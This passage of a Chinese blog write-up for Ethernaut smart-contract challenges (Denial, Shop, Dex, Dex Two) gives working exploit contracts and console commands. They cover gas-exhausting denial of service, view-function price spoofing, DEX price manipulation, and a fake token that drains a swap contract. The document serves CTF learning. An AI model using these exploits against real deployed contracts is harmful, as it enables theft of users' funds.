<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exp</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">calc</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        bytes32 f3 = <span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(<span class="title function_">bytes32</span>(<span class="title function_">uint</span>(<span class="number">1</span>))));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>**<span class="number">256</span>-<span class="number">1</span> -<span class="title function_">uint</span>(f3) +<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//得到35707666377435648211887908874984608119992236509074197713628505308453184860938</span></span><br></pre></td></tr></table></figure>

<p>控制台执行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">retract</span>()<span class="comment">//长度下溢</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="number">1</span>, <span class="keyword">function</span>(<span class="params">x, y</span>) &#123;<span class="variable language_">console</span>.<span class="title function_">info</span>(y)&#125;)<span class="comment">//查看长度</span></span><br><span class="line"><span class="string">&#x27;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">revise</span>(<span class="string">&quot;xxx&quot;</span>,<span class="string">&quot;0x000000000000000000000001&lt;player.address&gt;&quot;</span>)<span class="comment">//改变owner</span></span><br></pre></td></tr></table></figure>

<h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><p>阻止向owner转账</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Denial</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address payable public constant owner = <span class="title function_">address</span>(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setWithdrawPartner</span>(<span class="params">address _partner</span>) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        uint amountToSend = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>.<span class="title function_">div</span>(<span class="number">100</span>);</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.<span class="property">call</span>&#123;<span class="attr">value</span>:amountToSend&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        owner.<span class="title function_">transfer</span>(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].<span class="title function_">add</span>(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">contractBalance</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题的withdraw()函数分别向partner和owner转账1%，要做的是阻止owner转走</p>
<p>只要在partner的转帐中把gas耗尽，那么owner就无法转账。</p>
<p>在partner的receive函数中使用assert(false)，会depletes all gas</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Denial</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setWithdrawPartner</span>(<span class="params">address _partner</span>) external ;</span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) external ;</span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">contractBalance</span>(<span class="params"></span>) external view returns (uint) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span> &#123;</span><br><span class="line">    <span class="title class_">Denial</span> instance;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _instance</span>) public &#123;</span><br><span class="line">          instance = <span class="title class_">Denial</span>(_instance);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">hack</span>(<span class="params"></span>) public &#123;</span><br><span class="line">          instance.<span class="title function_">setWithdrawPartner</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">          instance.<span class="title function_">withdraw</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">receive</span>() external payable&#123;</span><br><span class="line">        <span class="title function_">assert</span>(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者重入攻击耗尽gas（未尝试，别的师傅的wp说没打出来）</p>
<h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><p>从商店以低于要求的价格购买商品</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Buyer</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">price</span>(<span class="params"></span>) external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Shop</span> &#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    <span class="title class_">Buyer</span> _buyer = <span class="title class_">Buyer</span>(msg.<span class="property">sender</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.<span class="title function_">price</span>() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.<span class="title function_">price</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和Elevator那题一样，两次调用price()函数返回值不一样即可，第一次返回大于100的数，第二次返回小于100的数</p>
<p>不同的是这里是view函数，不能改变变量</p>
<p>发现在第一次调用后改变了<code>bool public isSold</code>为true，因此可以根据isSold的状态来决定返回值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Shop</span> &#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params"></span>) public &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="title class_">Shop</span> instance;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _instance</span>) public &#123;</span><br><span class="line">        instance = <span class="title class_">Shop</span>(_instance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">price</span>(<span class="params"></span>) view public returns (uint)&#123;</span><br><span class="line">        <span class="keyword">if</span>(instance.<span class="title function_">isSold</span>() == <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">99</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">101</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        instance.<span class="title function_">buy</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h2><p>目的是把题目账户上的某个 token 清零</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Dex</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTokens</span>(<span class="params">address _token1, address _token2</span>) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">addLiquidity</span>(<span class="params">address token_address, uint amount</span>) public onlyOwner &#123;</span><br><span class="line">    <span class="title class_">IERC20</span>(token_address).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>((<span class="keyword">from</span> == token1 &amp;&amp; to == token2) || (<span class="keyword">from</span> == token2 &amp;&amp; to == token1), <span class="string">&quot;Invalid tokens&quot;</span>);</span><br><span class="line">    <span class="built_in">require</span>(<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swapAmount = <span class="title function_">getSwapPrice</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), swapAmount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">transferFrom</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), msg.<span class="property">sender</span>, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getSwapPrice</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * <span class="title class_">IERC20</span>(to).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)))/<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint amount</span>) public &#123;</span><br><span class="line">    <span class="title class_">SwappableToken</span>(token1).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">    <span class="title class_">SwappableToken</span>(token2).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address token, address account</span>) public view returns (uint)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">IERC20</span>(token).<span class="title function_">balanceOf</span>(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SwappableToken</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address dexInstance, string memory name, string memory symbol, uint256 initialSupply</span>) public <span class="title class_">ERC20</span>(name, symbol) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address owner, address spender, uint256 amount</span>) public <span class="title function_">returns</span>(<span class="params">bool</span>)&#123;</span><br><span class="line">    <span class="built_in">require</span>(owner != _dex, <span class="string">&quot;InvalidApprover&quot;</span>);</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_approve</span>(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有两种代币token1和token2，玩家各有10个，题目账户上各有100个，目的是把题目账户上的某个 token 清零</p>
<p>题目的 Dex 合约主要提供了 swap 这个函数用来在两个 token 间交换金额</p>
<p>调用swap时，玩家给题目账户一定数量的代币，题目账户根据比例给玩家兑换相应数量的另一种代币</p>
<p>兑换的比例由当前题目账户上两种代币的比例决定</p>
<p>比如题目账户 token1: token2&#x3D;10:1，那么玩家10枚token1才能换1枚token2</p>
<p>这个机制本身就是有问题的，来回兑换几次，就能兑空其中一个token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                  DEX       |        player  </span><br><span class="line">            token1 - token2 | token1 - token2</span><br><span class="line">            ----------------------------------</span><br><span class="line">初始情况	   100     100   |   10      10</span><br><span class="line">第1次兑换      110     90    |   0       20    </span><br><span class="line">第2次兑换      86      110   |   24      0    </span><br><span class="line">第3次兑换      110     80    |   0       30    </span><br><span class="line">第4次兑换      69      110   |   41      0    </span><br><span class="line">第5次兑换      110     45    |   0       65   </span><br><span class="line">第6次兑换      0       90    |   110     20</span><br></pre></td></tr></table></figure>

<p>控制台操作</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance, <span class="number">1000</span>)</span><br><span class="line"><span class="comment">//先approve增加allowances，后面transferFrom要用</span></span><br><span class="line"><span class="keyword">const</span> token1 = <span class="keyword">await</span> contract.<span class="title function_">token1</span>()</span><br><span class="line"><span class="keyword">const</span> token2 = <span class="keyword">await</span> contract.<span class="title function_">token2</span>()</span><br><span class="line"><span class="comment">//获取两个token地址</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token1, token2, <span class="number">10</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token2, token1, <span class="number">20</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token1, token2, <span class="number">24</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token2, token1, <span class="number">30</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token1, token2, <span class="number">41</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token2, token1, <span class="number">45</span>)</span><br><span class="line"><span class="comment">//来回兑换，直到换空一个</span></span><br></pre></td></tr></table></figure>

<p>然而<code>await contract.approve(instance, 1000)</code> 这步有问题，MetaMask会卡住一直转圈圈</p>
<p>github上找到issue: <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/ethernaut/issues/365">Level 22 Dex - Sentry 429 (Too Many Requests) in MetaMask · Issue #365 · OpenZeppelin&#x2F;ethernaut</a></p>
<p>解决方法是把<code>contract SwappableToken</code>在Remix ide编译</p>
<p>用<code>At Address</code>分别部署在两个token的位置，然后分别调用<code>approve()</code></p>
<h2 id="Dex-Two"><a href="#Dex-Two" class="headerlink" title="Dex Two"></a>Dex Two</h2><p>清空题目账户的两种token</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/access/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DexTwo</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTokens</span>(<span class="params">address _token1, address _token2</span>) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">add_liquidity</span>(<span class="params">address token_address, uint amount</span>) public onlyOwner &#123;</span><br><span class="line">    <span class="title class_">IERC20</span>(token_address).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swapAmount = <span class="title function_">getSwapAmount</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), swapAmount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">transferFrom</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), msg.<span class="property">sender</span>, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getSwapAmount</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * <span class="title class_">IERC20</span>(to).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)))/<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint amount</span>) public &#123;</span><br><span class="line">    <span class="title class_">SwappableTokenTwo</span>(token1).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">    <span class="title class_">SwappableTokenTwo</span>(token2).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address token, address account</span>) public view returns (uint)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">IERC20</span>(token).<span class="title function_">balanceOf</span>(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SwappableTokenTwo</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address dexInstance, string memory name, string memory symbol, uint initialSupply</span>) public <span class="title class_">ERC20</span>(name, symbol) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address owner, address spender, uint256 amount</span>) public <span class="title function_">returns</span>(<span class="params">bool</span>)&#123;</span><br><span class="line">    <span class="built_in">require</span>(owner != _dex, <span class="string">&quot;InvalidApprover&quot;</span>);</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_approve</span>(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>swap()</code>缺少了指定token的判断条件，可以自己构造一个新的 IERC20 的 token 参与进来</p>
<p>大量铸币然后随便换就行，可以参考<a target="_blank" rel="noopener" href="https://dev.to/nvn/ethernaut-hacks-level-23-dex-two-4424">Ethernaut Hacks Level 23: Dex Two - DEV Community</a></p>
<p>然而有一个更骚的，override <code>transferFrom()</code> 直接返回true，相当于白嫖不用付出代币</p>
<p>override  <code>balanceOf()</code> 使其始终返回 1，这样调用 <code>swap(new_token, to_token, 1)</code>时，<code>getSwapAmount()</code>的分母就为1，就能转出所有to代币，同时也能通过require</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DexTwo</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">EvilToken</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address account</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address, address, uint256</span>) public returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    address eviltoken;</span><br><span class="line">    <span class="title class_">DexTwo</span> instance;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _instance, address _eviltoken</span>) public &#123;</span><br><span class="line">        instance = <span class="title class_">DexTwo</span>(_instance);</span><br><span class="line">        eviltoken = _eviltoken;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exp</span>(<span class="params">address token</span>) public &#123;</span><br><span class="line">        challenge.<span class="title function_">swap</span>(eviltoken, token, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别对题目的两个token地址调用exp()即可</p>
<p>waiting to update……</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://szzzy.github.io">$2zz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://szzzy.github.io/post/62275aa2.html">https://szzzy.github.io/post/62275aa2.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://szzzy.github.io" target="_blank">$2zz's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/misc/">misc</a><a class="post-meta__tags" href="/tags/blockchain/">blockchain</a></div><div class="post_share"><div class="social-share" data-image="https://pic.rmb.bdstatic.com/bjh/3f076e2005afb4b23f5e70d0bcc61a99.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/92bf51ff.html"><img class="next-cover" src="https://pic.rmb.bdstatic.com/bjh/90c1c121fa400b5d54f9cf409850319e.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2022ciscn 初赛分区赛部分wp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/92bf51ff.html" title="2022ciscn 初赛分区赛部分wp"><img class="cover" src="https://pic.rmb.bdstatic.com/bjh/90c1c121fa400b5d54f9cf409850319e.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-03</div><div class="title">2022ciscn 初赛分区赛部分wp</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.rmb.bdstatic.com/bjh/d4484b84b1984aa8c45224433ba7aa7d.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">$2zz</div><div class="author-info__description">一级摆烂选手，很菜的misc手</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/szzzy"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/szzzy" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:szzshao823@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://www.zhihu.com/people/mo-xian-bao-4/posts" target="_blank" title="知乎"><i class="fa-brands fa-zhihu"></i></a><a class="social-icon" href="https://space.bilibili.com/151326498?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="fa-brands fa-bilibili"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to my blog.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li 